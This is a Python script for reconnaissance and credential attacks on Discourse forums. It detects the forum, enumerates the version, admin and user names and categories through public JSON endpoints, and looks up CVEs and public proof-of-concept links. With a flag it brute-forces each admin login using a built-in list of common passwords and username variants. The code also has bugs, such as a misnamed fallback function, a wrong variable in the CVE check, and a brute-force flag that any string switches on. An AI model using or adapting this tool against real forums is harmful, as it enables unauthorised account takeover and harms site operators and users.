import requests
import json
from colorama import Fore, Back, Style
import random
requests.packages.urllib3.disable_warnings()
from bs4 import BeautifulSoup
import argparse

print(f"""{Fore.RED}
  ___  _                          __  _             
 |   \(_)___ __ ___ _  _ _ _ ___ / /_| |___ ___ ___ 
 | |) | (_-</ _/ _ \ || | '_(_-</ / _| / _ (_-</ -_)
 |___/|_/__/\__\___/\_,_|_| /__/_/\__|_\___/__/\___| {Fore.RESET} {Fore.GREEN}v1.0{Fore.RESET} By {Fore.BLUE}@0xJoyghosh{Fore.RESET}
{Fore.YELLOW} --------------------------------------------------{Fore.RESET}
  Information Gathering Tool for Discourse Forums
{Fore.YELLOW} --------------------------------------------------{Fore.RESET}""")

class environment:
    useragents = [ "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"]
    passwords = ["password","123456","123456789","qwerty","12345678","111111","1234567890","1234567","password1","123123","987654321","qwertyuiop","mynoob","123321","666666","18atcskd2w","7777777","1q2w3e4r","654321","555555","3rjs1la7qe","google","1q2w3e4r5t","123qwe","zxcvbnm","1q2w3e","asdfgASDFG@1234","qwertyQWERTY","asdfgASDFG","zxcvbZXCVB","@2022","@2019","@2020","@2016", "admin", "admin123", "admin1234", "admin12345", "admin123"]

class confirm:
    def discourse(url):
        try:
            headers = {
                "User-Agent": random.choice(environment.useragents)
            }
            response = requests.get(url, headers=headers, verify=False)
            if response.status_code == 200:
                if '<meta name="discourse_theme_id"' in response.text:
                    return True
                else:
                    return False
            else:
                return False
        except:
            return False


class gather:
    def version(url):
        try:
            headers = {
                "User-Agent": random.choice(environment.useragents)
            }
            response = requests.get(url+"/about.json", headers=headers, verify=False)
            if response.status_code == 200:
                return response.json()["about"]["version"]
            else:
                return "error"
        except:
            return "error"
    def versionalt(url):
        try:
            headers = {
                "User-Agent": random.choice(environment.useragents)
            }
            response = requests.get(url, headers=headers, verify=False)
            meta = response.text.split("<meta name=\"generator\" content=\"")[1].split("\" />")[0]
            metashort = meta.split("Discourse")[1]
            metashort = metashort.split(" - ")[0]
            return metashort
        except:
            return "error"

        
    def admins(url):
        try:
            headers = {
                "User-Agent": random.choice(environment.useragents)
            }
            response = requests.get(url+"/about.json", headers=headers, verify=False)
            if response.status_code == 200:
                admins = response.json()["about"]["admins"]
                adminnames = []
                for admin in admins:
                    adminnames.append(admin["username"])
                return adminnames
            else:
                return "error"
        except:
            return "error"
    def adminalt(url):
        try:
            endpoints = url+"/directory_items.json?period=all"
            headers = {
                "User-Agent": random.choice(environment.useragents)
            }
            response = requests.get(endpoints, headers=headers, verify=False)
            if response.status_code == 200:
                data = response.json()["directory_items"]
                admins = []
                for item in data:
                    try:
                        if item["user"]["admin"] == True:
                            admins.append(item["user"]["username"])    
                    except:
                        pass
                return admins
            else:
                return "error"
        except:
            return "error"

    def categories(url):
        try:
            headers = {
                "User-Agent": random.choice(environment.useragents)
            }
            response = requests.get(url+"/categories.json", headers=headers, verify=False)
            if response.status_code == 200:
                categories = response.json()["category_list"]["categories"]
                categorynames = []
                for category in categories:
                    categorynames.append(category["name"])
                return categorynames
            else:
                return "error"
        except:
            return "error"

    def users(url):
        sequence = 0
        users = []
        while True:
            headers = {
                    "User-Agent": random.choice(environment.useragents)
                }
            try:
                response = requests.get(url+"/directory_items.json?period=all&order=likes_received&page="+str(sequence), headers=headers, verify=False)
                if response.status_code == 200:
                    if response.json()["directory_items"] == []:
                        break
                    for user in response.json()["directory_items"]:
                        users.append(user["user"]["username"])
                    sequence += 1
                else:
                    break
            except:
                break
        return users

def cves(ver):
    try:
        endpoint = "https://vulmon.com/searchpage?q=discourse+"+ver+"+&sortby=byrelevance"
        headers = {
            "User-Agent": random.choice(environment.useragents)
        }
        response = requests.get(endpoint, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")
        divs = soup.find_all("div", {"class": "item"})
        cves = []
        for div in divs:
            try:
                cves.append(div.find("a", {"class": "header"}).text)
            except:
                pass
        return cves
    except:
        return "error"

        
class brute:
    def login(url, username, password):
        try:
            session = requests.session()
            endpoint1 = url+"/session/csrf"
            headers = {"Discourse-Track-View": "true", "Sec-Ch-Ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"", "Discourse-Present": "true", "X-Csrf-Token": "undefined", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36", "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Platform": "\"Windows\"", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://forum.silverstripe.org/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
            response = session.get(endpoint1, headers=headers, verify=False)
            if response.status_code == 200:
                endpoint2 = url+"/session"
                token = response.json()["csrf"]
                headers = {"Discourse-Track-View": "true", "Sec-Ch-Ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"", "Discourse-Present": "true", "X-Csrf-Token": token, "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36", "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Platform": "\"Windows\"", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://forum.silverstripe.org/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
                data = {"login": username, "password": password}
                response = session.post(endpoint2, headers=headers, data=data, verify=False)
                if response.status_code == 200:
                    if "user_badges" in response.json():
                        return True
                    else:
                        return False
            else:
                return False
        except:
            return False
def pocingithub(cve):
    try:
        year = cve.split("-")[1]
        endpoint = "https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/"+year+"/"+cve+".json"
        headers = {
            "User-Agent": random.choice(environment.useragents)
        }
        response = requests.get(endpoint, headers=headers, verify=False)
        cve_text=response.json()
        cve_conv=cve_text[0]
        cve_dump=json.dumps(cve_conv)
        cve_load=json.loads(cve_dump)
        return cve_load["html_url"]
    except:
        return "error"

def commonpasswords(username):
    passwords = []
    for password in environment.passwords:
        passwords.append(password)
        passwords.append(password+username)
        passwords.append(username+"@"+password)
    return passwords

def scan(url, b):
    if url[-1] == "/":
        url = url[:-1]
        print(f" [{Fore.RED}TARGET{Fore.RESET}] {url}")
    else:
        print(f" [{Fore.RED}TARGET{Fore.RESET}] {url}")
    print(f" [{Fore.RED}DETECTION{Fore.RESET}] Started")
    detct = confirm.discourse(url)
    if detct == True:
        print(f" [{Fore.GREEN}DETECTION{Fore.RESET}] Discourse Forum Detected")
  
        print(f" -----------------------{Fore.RED}ENUMERATION{Fore.RESET}-----------------------")
        
        print(f" [{Fore.RED}ENUMERATION{Fore.RESET}] Started")
        version = gather.version(url)
        if version == "error":
            print(f" [{Fore.RED}ENUMERATION{Fore.RESET}] 1/2 Version Enumeration Failed")
            version = gather.versionalt(url)
            if version == "error":
                print(f" [{Fore.RED}ENUMERATION{Fore.RESET}] 2/2 Version Enumeration Failed")
            else:
                print(f" [{Fore.GREEN}ENUMERATION{Fore.RESET}] 2/2 Version Enumeration Successful")
                print(f" [{Fore.GREEN}VERSION{Fore.RESET}] {version}")
        else:
            print(f" [{Fore.GREEN}ENUMERATION{Fore.RESET}] 1/2 Version Enumeration Successful")
            print(f" [{Fore.GREEN}VERSION{Fore.RESET}] {version}")
        print(f" -----------------------{Fore.RED}CVES{Fore.RESET}-----------------------")
        print(f" [{Fore.RED}CVE Scan{Fore.RESET}] Started")
        version = version.split(".beta")[0]
        cver = cves(version)
        if cves == "error":
            print(f" [{Fore.RED}CVE Scan{Fore.RESET}] No CVEs Found")
        else:
            print(f" [{Fore.GREEN}CVE Scan{Fore.RESET}] CVEs Found")
            for cve in cver:
                print(f" [{Fore.GREEN}CVE{Fore.RESET}] {cve}")
                poc = pocingithub(cve)
                if poc == "error":
                    print(f" [{Fore.RED}POC in Github{Fore.RESET}] No POC Found")
                else:
                    print(f" [{Fore.GREEN}POC in Github{Fore.RESET}] {poc}")
        print(f" -----------------------{Fore.RED}Admins{Fore.RESET}-----------------------")
        print(f" [{Fore.RED}Admin Scan{Fore.RESET}] Started")
        admins = gather.admins(url)
        if admins == "error":
            print(f" [{Fore.RED}Admin Scan{Fore.RESET}] 1/2 Admin Enumeration Failed")
            admins = gather.adminsalt(url)
            if admins == "error":
                print(f" [{Fore.RED}Admin Scan{Fore.RESET}] 2/2 Admin Enumeration Failed")
            else:
                print(f" [{Fore.GREEN}Admin Scan{Fore.RESET}] 2/2 Admin Enumeration Successful")
                print(f" [{Fore.GREEN}Admin Scan{Fore.RESET}] found {len(admins)} Admins")
                print(f" [{Fore.GREEN}Admin Usernames{Fore.RESET}] {admins}")
        else:
            print(f" [{Fore.GREEN}Admin Scan{Fore.RESET}] 1/2 Admin Enumeration Successful")
            print(f" [{Fore.GREEN}Admin Scan{Fore.RESET}] found {len(admins)} Admins")
            print(f" [{Fore.GREEN}Admin Usernames{Fore.RESET}] {admins}")
        print(f" -----------------------{Fore.RED}Users{Fore.RESET}-----------------------")
        print(f" [{Fore.RED}User Scan{Fore.RESET}] Started")
        users = gather.users(url)
        if users == "error":
            print(f" [{Fore.RED}User Scan{Fore.RESET}] 1/1 User Enumeration Failed")
        else:
            print(f" [{Fore.GREEN}User Scan{Fore.RESET}] 1/1 User Enumeration Successful")
            print(f" [{Fore.GREEN}User Scan{Fore.RESET}] found {len(users)} Users")
            print(f" [{Fore.GREEN}Usernames{Fore.RESET}] {users}")
        print(f" -----------------------{Fore.RED}Catagories{Fore.RESET}-----------------------")
        print(f" [{Fore.RED}Catagory Scan{Fore.RESET}] Started")
        catagories = gather.categories(url)
        if catagories == "error":
            print(f" [{Fore.RED}Catagory Scan{Fore.RESET}] 1/1 Catagory Enumeration Failed")
        else:
            print(f" [{Fore.GREEN}Catagory Scan{Fore.RESET}] 1/1 Catagory Enumeration Successful")
            print(f" [{Fore.GREEN}Catagory Scan{Fore.RESET}] found {len(catagories)} Catagories")
            print(f" [{Fore.GREEN}Catagories{Fore.RESET}] {catagories}")
            print("------------------------------------------------------------")
    if b==True:
            print(f" -----------------------{Fore.RED}Brute Force{Fore.RESET}-----------------------")
            print(f" [{Fore.RED}Brute Force{Fore.RESET}] Started")
            for admin in admins:
                print(f" [{Fore.RED}Brute Force{Fore.RESET}] Started for {admin}")
                passwords = commonpasswords(admin)
                print(f" [{Fore.RED}Brute Force{Fore.RESET}] {len(passwords)} Passwords Loaded")
                print(f" [{Fore.BLUE}info{Fore.RESET}] It usages common passwords patterns")
                for password in passwords:
                    print(f" [{Fore.RED}Brute Force{Fore.RESET}] Trying {password}", end="\r")
                    login = brute.login(url, admin, password)
                    if login == True:
                        print(f" [{Fore.GREEN}Brute Force{Fore.RESET}] Successful")
                        print(f" [{Fore.GREEN}Username{Fore.RESET}] {admin}")
                        print(f" [{Fore.GREEN}Password{Fore.RESET}] {password}")
                        break
                    else:
                        print(f" [{Fore.RED}Brute Force{Fore.RESET}] Failed", end="\r")
        
        

parser = argparse.ArgumentParser(description="Discourse Scanner")
parser.add_argument("-u", "--url", help="URL of the Discourse")
parser.add_argument("-b", "--brute", help="Brute Force Admins set True or False", default=False)
args = parser.parse_args()
if args.url:
    url = args.url
    b = args.brute
    scan(url, b)
else:
    print("Please enter a url")
